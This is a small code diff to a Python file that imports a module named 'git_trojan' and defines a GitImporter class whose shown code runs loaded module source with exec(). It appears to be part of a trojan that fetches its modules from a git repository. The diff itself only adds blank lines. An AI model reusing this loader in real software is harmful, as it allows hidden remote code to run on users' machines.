@@ -4,6 +4,7 @@ import types
 import sys
 import git_trojan
 
+
 class GitImporter(object):
     def __init__(self):
         self.current_module_code =""
@@ -23,5 +24,6 @@ class GitImporter(object):
         exec(self.current_module_code, module.__dict__)
         sys.modules[name] = module
         return module
+
 
 
